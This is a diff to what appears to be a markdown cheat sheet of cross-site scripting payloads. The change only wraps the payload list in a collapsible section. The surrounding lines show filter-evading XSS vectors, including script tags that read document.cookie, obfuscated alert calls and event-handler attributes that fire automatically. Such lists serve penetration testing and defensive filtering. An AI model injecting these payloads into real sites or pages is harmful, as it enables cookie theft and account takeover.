@@ -30,6 +30,9 @@
 ## XSS Payloads <br>
 
 <details>
+
+<summary>Click to expand!</summary>
+
 ```txt
 <script>alert(document.domain+"\n\n"+document.cookie);<script>
 </script><svg><script/class=rodric>alert(1)</script>-%26apos;
@@ -171,6 +174,7 @@ xss><svg/onload=globalThis[`al`+/ert/.source]`1`//
 <th ondblclick="alert(1)" autofocus tabindex=1>test</th>
 <th onfocusout=alert(1) tabindex=1 id=x></th><input autofocus>
 ```
+
 </details>
 
 ## XSS + SSRF <br>
